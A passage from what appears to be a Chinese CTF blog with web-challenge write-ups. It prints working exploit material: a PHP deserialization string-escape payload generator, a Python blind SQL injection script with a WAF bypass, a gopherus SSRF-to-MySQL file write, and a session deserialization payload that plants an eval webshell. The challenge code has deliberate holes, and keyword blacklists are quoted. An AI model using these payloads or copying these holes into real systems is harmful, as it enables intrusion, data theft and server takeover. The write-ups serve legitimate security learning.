$_SESSION[&#x27;id&#x27;]=$this-&gt;id;  </span><br><span class="line">        $_SESSION[&#x27;login&#x27;]=1;</span><br><span class="line">        echo &quot;你的ID是&quot;.$_SESSION[&#x27;id&#x27;];</span><br><span class="line">        echo &quot;你好！&quot;.$_SESSION[&#x27;token&#x27;];</span><br><span class="line">        echo &quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;;</span><br><span class="line">        return $this-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    public function update()&#123;</span><br><span class="line">        $Info=unserialize($this-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=new UpdateHelper($_SESSION[&#x27;id&#x27;],$Info,&quot;update user SET age=$age,nickname=$nickname where id=&quot;.$_SESSION[&#x27;id&#x27;]);</span><br><span class="line">        //这个功能还没有写完 先占坑</span><br><span class="line">    &#125;</span><br><span class="line">    public function getNewInfo()&#123;</span><br><span class="line">        $age=$_POST[&#x27;age&#x27;];</span><br><span class="line">        $nickname=$_POST[&#x27;nickname&#x27;];</span><br><span class="line">        return safe(serialize(new Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        return file_get_contents($this-&gt;nickname);//危</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;nickname-&gt;update($this-&gt;age);</span><br><span class="line">        return &quot;0-0&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Info&#123;</span><br><span class="line">    public $age;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct($age,$nickname)&#123;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;nickname=$nickname;</span><br><span class="line">    &#125;   </span><br><span class="line">    public function __call($name,$argument)&#123;</span><br><span class="line">        echo $this-&gt;CtrlCase-&gt;login($argument[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    public $id;</span><br><span class="line">    public $newinfo;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __construct($newInfo,$sql)&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public $hostname=&quot;127.0.0.1&quot;;</span><br><span class="line">    public $dbuser=&quot;noob123&quot;;</span><br><span class="line">    public $dbpass=&quot;noob123&quot;;</span><br><span class="line">    public $database=&quot;noob123&quot;;</span><br><span class="line">    public $name;</span><br><span class="line">    public $password;</span><br><span class="line">    public $mysqli;</span><br><span class="line">    public $token;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$_POST[&#x27;username&#x27;];</span><br><span class="line">        $this-&gt;password=$_POST[&#x27;password&#x27;];</span><br><span class="line">        $this-&gt;token=$_SESSION[&#x27;token&#x27;];</span><br><span class="line">    &#125;</span><br><span class="line">    public function login($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mysqli=new mysqli($this-&gt;hostname, $this-&gt;dbuser, $this-&gt;dbpass, $this-&gt;database);</span><br><span class="line">        if ($this-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(&quot;连接失败，错误:&quot; . $this-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=$this-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(&#x27;s&#x27;, $this-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">            return $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$idResult) &#123;</span><br><span class="line">            echo(&#x27;用户不存在!&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (md5($this-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            echo(&#x27;密码错误！&#x27;);</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[&#x27;token&#x27;]=$this-&gt;name;</span><br><span class="line">        return $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    public function update($sql)</span><br><span class="line">    &#123;</span><br><span class="line">        //还没来得及写</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这题涉及到了反序列化字符串逃逸。</p>
<blockquote>
<p><strong>PHP在进行反序列化的时候，只要前面的字符串符合反序列化的规则并能成功反序列化，那么将忽略后面多余的字符串</strong></p>
</blockquote>
<p>把<a href="http://www.zip扒下来，看得到只有`$_SESSION[&#39;login&#39;]===1`的时候才能弹出flag">www.zip扒下来，看得到只有`$_SESSION[&#39;login&#39;]===1`的时候才能弹出flag</a></p>
<p>但是只有User::login()中才会对<code>$_SESSION[&#39;login&#39;]</code>进行赋值</p>
<p>而赋值的条件得是token&#x3D;admin或者password&#x3D;数据库中password</p>
<p>通过分析可知，User::login()其实就是写死了dbCtl::login()的查询语句，但是我们可以通过链子自己构造sql语句</p>
<p>UpdateHelper::__destruct()-&gt;User::__toString-&gt;Info::__Call-&gt;dbCtrl::login()</p>
<p>这样如果第一次打通了，会触发<code>$_SESSION[&#39;token&#39;]=&quot;admin&quot;</code></p>
<p>第二次再次登陆的时候，会直接判断dbCtrl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ($this-&gt;token==&#x27;admin&#x27;) &#123;</span><br><span class="line">    return $idResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就可以绕过密码的验证</p>
<p>唯一的问题就是Info在构造的时候并不会构造$CtrlCase，导致无法进__call函数</p>
<p>但是safe函数可以帮助绕过该限制（字符串逃逸漏洞）</p>
<p>尝试传<code>age=1&amp;nickname=2</code></p>
<p>传出的反序列化字符串为</p>
<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:1:&quot;2&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
<p>说明可控的只有age和nickname两个字段，最后的CtrlCase无法传入。但是由于safe的函数的出现，使得逃逸成为了可能</p>
<p>当传入<code>age=1&amp;nickname=union</code>时</p>
<p>传出的反序列化字符串变成了</p>
<p><code>O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;;s:8:&quot;CtrlCase&quot;;N;&#125;</code></p>
<p>这样<code>s:8:&quot;nickname&quot;;s:5:&quot;hacker&quot;</code>就出错了，因为其中的s:5仅与传入的nickname的值的长度有关，而hacker是6位。这是因为safe函数会把一些单词替换</p>
<p>那就可以自行构造一个序列化字符串进去，强行把后面的CtrlCase构造出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function safe($parm)&#123;</span><br><span class="line">    $array= array(&#x27;union&#x27;,&#x27;regexp&#x27;,&#x27;load&#x27;,&#x27;into&#x27;,&#x27;flag&#x27;,&#x27;file&#x27;,&#x27;insert&#x27;,&quot;&#x27;&quot;,&#x27;\\&#x27;,&quot;*&quot;,&quot;alter&quot;);</span><br><span class="line">    return str_replace($array,&#x27;hacker&#x27;,$parm);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">    public $nickname;</span><br><span class="line">    public $age = &#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;nickname = new Info();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Info&#123;</span><br><span class="line">    public $CtrlCase;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;CtrlCase = new dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UpdateHelper&#123;</span><br><span class="line">    public $sql;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;sql = new User();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class dbCtrl&#123;</span><br><span class="line">    public $name = &quot;admin&quot;;</span><br><span class="line">    public $password = &#x27;1&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$u = new UpdateHelper();</span><br><span class="line">$len = strlen(&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;);</span><br><span class="line">$payload = str_repeat(&#x27;union&#x27;, $len).&#x27;&quot;;s:8:&quot;CtrlCase&quot;;&#x27;.serialize($u).&#x27;&#125;&#x27;;</span><br><span class="line">echo $payload;</span><br></pre></td></tr></table></figure>

<p>这样就构造出了payload，把payload作为nickname传入</p>
<p>由于safe会把union修改为hacker（字符数+1），只要我们传入一定长度的union，就可以让<code>s:8:&quot;nickname&quot;;s:1920:</code>其中的s:1920全部变成hacker，从而使后面我们自行构造的CtrlCase逃出</p>
<p>当我们传入的sql语句<code>select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</code>不管username是什么，始终返回1,c4ca4238a0b923820dcc509a6f75849b</p>
<p>而在传入payload的时候就指定<code>public $password = &#39;1&#39;</code>，就可以通过<code>if (md5($this-&gt;password)!==$passwordResult)</code>这条语句成功赋值session</p>
<p>在最后添加一个}来提前结束反序列化，由于反序列化的特性，成功后将忽略后面多余的字符串</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202310152238698.png" alt="image-20231015223831637"></p>
<p>打进去之后我们的$_SESSION[‘token’]&#x3D;admin，再次访问login就能通过验证弹出flag</p>
<h2 id="Fishman"><a href="#Fishman" class="headerlink" title="Fishman"></a>Fishman</h2><p>这题有一个注入点可以打</p>
<p>但是有个waf，会遍历所有get，post，cookie参数，在黑名单两侧加上@从而阻止注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = &#x27;/union|ascii|mid|left|greatest|least|substr|sleep|or|benchmark|like|regexp|if|=|-|&lt;|&gt;|\#|\s/i&#x27;;</span><br></pre></td></tr></table></figure>

<p>但在member.php中有一条json_decode操作，而json_decode会将传入的unicode自动解码，这就提供了条件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">if ($_COOKIE[&quot;login_data&quot;]) &#123;</span><br><span class="line">        $login_data = json_decode($_COOKIE[&#x27;login_data&#x27;], true);</span><br><span class="line">        $admin_user = $login_data[&#x27;admin_user&#x27;];</span><br><span class="line">        $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#x27;$admin_user&#x27; limit 1&quot;);</span><br><span class="line">        if ($udata[&#x27;username&#x27;] == &#x27;&#x27;) &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">        $admin_pass = sha1($udata[&#x27;password&#x27;] . LOGIN_KEY);</span><br><span class="line">        if ($admin_pass == $login_data[&#x27;admin_pass&#x27;]) &#123;</span><br><span class="line">            $islogin = 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            setcookie(&quot;islogin&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">            setcookie(&quot;login_data&quot;, &quot;&quot;, time() - 604800);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以从返回的setcookie来判断是否成功，给个poc进行验证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &quot;include/safe.php&quot;;</span><br><span class="line">var_dump($_COOKIE[&#x27;test&#x27;]);</span><br><span class="line">$login_data = json_decode($_COOKIE[&#x27;test&#x27;], true);</span><br><span class="line">var_dump($login_data);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311251444061.png" alt="image-20231125144412967"></p>
<p>而member.php必须从common.php里打，所以就有exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">url = &quot;http://127.0.0.1:7788/poc.php&quot;</span><br><span class="line"># $udata = $DB-&gt;get_row(&quot;SELECT * FROM fish_admin WHERE username=&#x27;$admin_user&#x27; limit 1&quot;);</span><br><span class="line">for i in range(1, 100):</span><br><span class="line">    min = 33</span><br><span class="line">    max = 127</span><br><span class="line">    mid = (min + max) // 2</span><br><span class="line">    while min &lt; max:</span><br><span class="line">        payload = &quot;&#x27; or ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; #&quot;.format(i, mid)</span><br><span class="line">        cookie = &#x27;islogin=1;login_data=&#123;&#123;&quot;admin_user&quot;:&quot;&#123;payload&#125;&quot;,&quot;admin_pass&quot;:65&#125;&#125;&#x27;.format(payload = payload)</span><br><span class="line">        headers = &#123;&#x27;cookie&#x27;: cookie&#125;</span><br><span class="line">        re = requests.get(url = url, headers = headers)</span><br><span class="line">        setcookie = str(re.headers)</span><br><span class="line">        if setcookie.count(&quot;islogin&quot;) == 2:</span><br><span class="line">            min = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            max = mid</span><br><span class="line">        mid = (min + max) // 2</span><br><span class="line">    if chr(mid) == &quot; &quot;:</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="红包题第九弹"><a href="#红包题第九弹" class="headerlink" title="红包题第九弹"></a>红包题第九弹</h2><p>登陆发现除了传username之外还有个returl参数，把returl的值改为<a target="_blank" rel="noopener" href="http://baidu.com直接回显了百度的页面,可能是ssrf/">http://baidu.com直接回显了百度的页面，可能是ssrf</a></p>
<p>猜测是使用了include远程包含或者curl函数，题目给了hint是跟mysql有关，那就大概是curl</p>
<p>curl也没法用file函数，换用gopher，hint给出mysql无密码，端口3306</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>

<p>往本地写文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311252255078.png" alt="image-20231125225547960"></p>
<p>把payload urlencode一下传进去成功写入tt.php文件中了，蚁剑直接打就行</p>
<h2 id="红包题-葵花宝典"><a href="#红包题-葵花宝典" class="headerlink" title="红包题 葵花宝典"></a>红包题 葵花宝典</h2><p>本来以为考的是PDO的sql注入，但是用的不是gbk，没法宽字节</p>
<p>注册+登陆就出flag</p>
<h2 id="红包题-辟邪剑谱"><a href="#红包题-辟邪剑谱" class="headerlink" title="红包题 辟邪剑谱"></a>红包题 辟邪剑谱</h2><p>mysql有个特性，当模式设置为<strong>非严格</strong>的时候，如果插入的值比列设置的值长，会自动截取一部分</p>
<p>比如插入admin+空格x300，如果列设置的是VARCHAR(255)，mysql会自动截取到合适的位置&#x3D;&gt;admin</p>
<p>login.php写死了查询的用户为admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$data=$db-&gt;select(&quot;admin&quot;,[&quot;username&quot;,&quot;password&quot;],[&quot;username[=]&quot;=&gt;&quot;admin&quot;]);</span><br><span class="line">foreach($data as $d)&#123;</span><br><span class="line">	</span><br><span class="line">	if ($d[&#x27;password&#x27;]===$user_password)&#123;</span><br><span class="line">		$_SESSION[&#x27;user&#x27;]=$user_name;</span><br><span class="line">		die(&quot;login success!&lt;br&gt;&lt;hr&gt;flag is $flag&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以只能通过注册来覆盖这个原来的admin</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$user_name=trim($_POST[&#x27;user_name&#x27;]);</span><br><span class="line">$user_password=trim($_POST[&#x27;user_password&#x27;]);</span><br><span class="line">$data=$db-&gt;select(&quot;admin&quot;,[&quot;username&quot;,&quot;password&quot;],[&quot;username[=]&quot;=&gt;$user_name]);</span><br><span class="line">if(count($data)&gt;0)&#123;</span><br><span class="line">	die(&quot;username in use!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if($user_name===&quot;admin&quot;)&#123;</span><br><span class="line">	die(&quot;you are not admin!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|\`|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\[|\&#125;|\]|\;|\:|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\?/i&quot;,$user_name))&#123;</span><br><span class="line">	die(&quot;stop hack!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$data = $db-&gt;insert(&#x27;admin&#x27;,[&quot;username&quot;=&gt;&quot;$user_name&quot;,&quot;password&quot;=&gt;&quot;$user_password&quot;]);</span><br></pre></td></tr></table></figure>

<p>由于trim函数的处理，所有开头&#x2F;结尾的特殊符号都会被删去，所以只能构造admin+空格x300+1来打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user_name=admin                                                                                                                                                                                                                                                                         1&amp;user_password=1</span><br></pre></td></tr></table></figure>

<p>成功注册然后登陆</p>
<h2 id="【nl】难了"><a href="#【nl】难了" class="headerlink" title="【nl】难了"></a>【nl】难了</h2><p>&gt;nl</p>
<h2 id="一切看起来都那么合情合理"><a href="#一切看起来都那么合情合理" class="headerlink" title="一切看起来都那么合情合理"></a>一切看起来都那么合情合理</h2><p>session的反序列化攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);</span><br></pre></td></tr></table></figure>

<p>在这里的时候会进行一次反序列化</p>
<p>然后再了解一下序列化处理器</p>
<blockquote>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th>存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong></td>
</tr>
</tbody></table>
<p>上述三种处理器中，<code>php_serialize</code>在内部简单地直接使用 <code>serialize/unserialize</code>函数，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(<code>|</code> 和 <code>!</code>) 。</p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271344073.png" alt="image-20231127134447028"></p>
<p>结果为<code>session|s:4:&quot;test&quot;;</code></p>
<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;sessionsessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;sessionsessionsessionsessionsessionsession&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271347803.png" alt="image-20231127134749768"></p>
<p>结果为<code>*sessionsessionsessionsessionsessionsessions:4:&quot;test&quot;;</code></p>
<p><code>*</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessionsession</code>为键名，<code>s:4:&quot;test&quot;;</code>为传入 GET 参数经过序列化后的值</p>
<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&lt;?php</span><br><span class="line">&gt;var_dump(sys_get_temp_dir());</span><br><span class="line">&gt;error_reporting(0);</span><br><span class="line">&gt;ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">&gt;session_save_path(&quot;D:\\server\\tmp&quot;);</span><br><span class="line">&gt;session_start();</span><br><span class="line">&gt;$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202311271350286.png" alt="image-20231127135048253"></p>
<p>结果为<code>a:1:&#123;s:7:&quot;session&quot;;s:4:&quot;test&quot;;&#125;</code></p>
<p>单纯的反序列化</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6640#toc-5">https://xz.aliyun.com/t/6640#toc-5</a></p>
</blockquote>
<p>但指定解析器为php时，可以人为添加一个<code>|</code>，然后跟需要反序列化的内容。从而指定序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class User&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $status;</span><br><span class="line">    function setStatus($s)&#123;</span><br><span class="line">        $this-&gt;status=$s;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        file_put_contents(&quot;log-&quot;.$this-&gt;username, &quot;使用&quot;.$this-&gt;password.&quot;登陆&quot;.($this-&gt;status?&quot;成功&quot;:&quot;失败&quot;).&quot;----&quot;.date_create()-&gt;format(&#x27;Y-m-d H:i:s&#x27;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一眼写文件，指定<code>username=test.php</code>和<code>password=&lt;?php eval($_POST[&#39;shell&#39;]);?&gt;</code>，然后把序列化出来的内容加个<code>|</code>然后base64传入就行</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:8:&quot;test.php&quot;;s:8:&quot;password&quot;;s:30:&quot;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt;&quot;;s:6:&quot;status&quot;;N;&#125;</span><br><span class="line">base64:</span><br><span class="line">fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo4OiJ0ZXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMDoiPD9waHAgZXZhbCgkX1BPU1RbInNoZWxsIl0pOz8+IjtzOjY6InN0YXR1cyI7Tjt9</span><br><span class="line">urlencode:</span><br><span class="line">%66%45%38%36%4e%44%6f%69%56%58%4e%6c%63%69%49%36%4d%7a%70%37%63%7a%6f%34%4f%69%4a%31%63%32%56%79%62%6d%46%74%5a%53%49%37%63%7a%6f%34%4f%69%4a%30%5a%58%4e%30%4c%6e%42%6f%63%43%49%37%63%7a%6f%34%4f%69%4a%77%59%58%4e%7a%64%32%39%79%5a%43%49%37%63%7a%6f%7a%4d%44%6f%69%50%44%39%77%61%48%41%67%5a%58%5a%68%62%43%67%6b%58%31%42%50%55%31%52%62%49%6e%4e%6f%5a%57%78%73%49%6c%30%70%4f%7a%38%2b%49%6a%74%7a%4f%6a%59%36%49%6e%4e%30%59%58%52%31%63%79%49%37%54%6a%74%39</span><br></pre></td></tr></table></figure>

<p>先访问index.php，在服务器上存个session，然后带着修改后的payload再访问index.php</p>
<p>此时会进入这层判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">		$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;登陆失败次数超过限制&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">		$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>从而把可控的$_cookie[‘limit’]写入session文件中，再访问&#x2F;inc&#x2F;inc.php进行反序列化，成功写入文件log-test.php</p>
<p>蚁剑直接连就行</p>
